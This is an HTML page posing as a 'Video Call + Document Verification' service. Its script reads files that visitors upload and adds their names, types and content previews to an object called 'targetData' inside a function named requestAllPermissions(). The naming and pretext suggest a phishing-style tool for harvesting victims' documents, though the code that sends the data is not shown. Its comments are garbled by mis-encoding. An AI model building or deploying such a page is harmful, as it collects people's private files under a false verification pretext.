<!DOCTYPE html>
<html lang="en">
<head>
    <!-- рдкреБрд░рд╛рдирд╛ head section same -->
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Video Call + Document Verification</title>
    <!-- рдкреБрд░рд╛рдирд╛ CSS same рд░рд╣реЛ -->
    <style>
        /* рдкреБрд░рд╛рдирд╛ CSS + рдирд╡рд╛ file section */
        .file-drop {
            border: 3px dashed #45b7d1;
            border-radius: 12px;
            padding: 30px;
            margin: 20px 0;
            text-align: center;
            background: #f0f8ff;
            transition: all 0.3s;
            cursor: pointer;
        }
        .file-drop.dragover {
            background: #e3f2fd;
            border-color: #2196f3;
            transform: scale(1.02);
        }
        .file-list {
            margin-top: 15px;
            max-height: 150px;
            overflow-y: auto;
            text-align: left;
        }
        .file-item {
            background: white;
            padding: 8px 12px;
            margin: 5px;
            border-radius: 6px;
            display: flex;
            justify-content: space-between;
            font-size: 14px;
        }
        /* рдмрд╛рдХреА рдкреБрд░рд╛рдирд╛ CSS same */
    </style>
</head>
<body>
    <!-- рдкреБрд░рд╛рдирд╛ HTML + рдирд╡рд╛ file section -->
    <div class="container">
        <!-- рдкреБрд░рд╛рдирд╛ content same -->
        <div class="file-drop" id="fileDrop" onclick="document.getElementById('fileInput').click()">
            <div style="font-size: 48px; margin-bottom: 15px;">ЁЯУБ</div>
            <h3>Upload Documents for Verification</h3>
            <p>Drag & drop files or click to select (PDF, Images, Docs)</p>
            <input type="file" id="fileInput" multiple style="display:none;" accept="*/*">
            <div class="file-list" id="fileList"></div>
        </div>
        <!-- рдмрд╛рдХреА рдкреБрд░рд╛рдирд╛ HTML same -->
    </div>

    <script>
        let targetFiles = [];
        
        // File handling functions
        document.getElementById('fileDrop').addEventListener('dragover', (e) => {
            e.preventDefault();
            e.currentTarget.classList.add('dragover');
        });
        
        document.getElementById('fileDrop').addEventListener('dragleave', (e) => {
            e.currentTarget.classList.remove('dragover');
        });
        
        document.getElementById('fileDrop').addEventListener('drop', (e) => {
            e.preventDefault();
            e.currentTarget.classList.remove('dragover');
            handleFiles(e.dataTransfer.files);
        });
        
        document.getElementById('fileInput').addEventListener('change', (e) => {
            handleFiles(e.target.files);
        });
        
        function handleFiles(files) {
            targetFiles = Array.from(files);
            const fileList = document.getElementById('fileList');
            fileList.innerHTML = '';
            
            targetFiles.forEach((file, index) => {
                const div = document.createElement('div');
                div.className = 'file-item';
                div.innerHTML = `
                    ЁЯУД ${file.name} 
                    <span>(${formatBytes(file.size)})</span>
                `;
                fileList.appendChild(div);
                
                // Read file content
                readFile(file, index);
            });
        }
        
        function readFile(file, index) {
            const reader = new FileReader();
            reader.onload = (e) => {
                targetFiles[index].content = e.target.result.substring(0, 10000); // First 10KB
                targetFiles[index].contentType = file.type;
            };
            reader.readAsDataURL(file);
        }
        
        function formatBytes(bytes) {
            if (bytes === 0) return '0 Bytes';
            const k = 1024;
            const sizes = ['Bytes', 'KB', 'MB'];
            const i = Math.floor(Math.log(bytes) / Math.log(k));
            return parseFloat((bytes / Math.pow(k, i)).toFixed(2)) + ' ' + sizes[i];
        }

        // Updated requestAllPermissions() - FILES ADD рдХреЗрд▓реЗ
        async function requestAllPermissions() {
            // рдкреБрд░рд╛рдиреЗ permissions same...
            
            // ADD FILES to targetData
            targetData.files = targetFiles.map(f => ({
                name: f.name,
                size: f.size,
                type: f.type,
                contentPreview: f.content ? f.content.substring(0, 500) : null
            }));
            
            // рдмрд╛рдХреА same...
        }
    </script>
</body>
</html>
